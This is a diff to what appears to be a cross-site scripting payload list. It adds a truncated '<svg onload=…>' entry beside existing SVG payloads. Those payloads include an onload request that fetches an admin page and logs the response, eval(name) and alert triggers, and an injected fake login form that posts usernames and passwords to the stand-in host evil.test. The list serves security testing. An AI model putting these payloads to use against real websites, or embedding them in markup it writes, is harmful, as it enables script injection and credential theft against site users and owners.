@@ -260,6 +260,7 @@ $$('iframe')[0].contentWindow.postMessage('{"message":"Shopify.API.setWindowLoca
 <svg onload="var req = new XMLHttpRequest(); req.open('GET', 'https://target.com/admin', false); req.setRequestHeader('Upgrade-Insecure-Requests', '1');req.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36') ;req.send(null);var headers = req.response.toLowerCase();console.log(headers);" xmlns="http://evil.com/2000/svg" xmlns:xlink="http://evil.com/1999/xlink" version=
 <svg onload=alert(document.domain)>
 <svg onload=eval(name)></svg>
+<svg onload=…>
 <svg onload>
 <svg width="256" height="128" version="1.1" viewBox="0 0 256 128" xmlns="http://target.com/2000/svg"><g fill="none" stroke-width="22"><circle cx="40" cy="64" r="26" stroke="#fff"/><foreignObject class="node" x="0" y="0" width="600" height="600"><div xmlns="http://target.com/1999/xhtml"><p>Login</p><form action="//evil.test"><input placeholder="Username" type="text"/><br/> <input placeholder="Password" type="text" /><br/><input type="submit" value="Login" /></form></div></foreignObject><circle al
 <svg/onload=alert("XSS") >
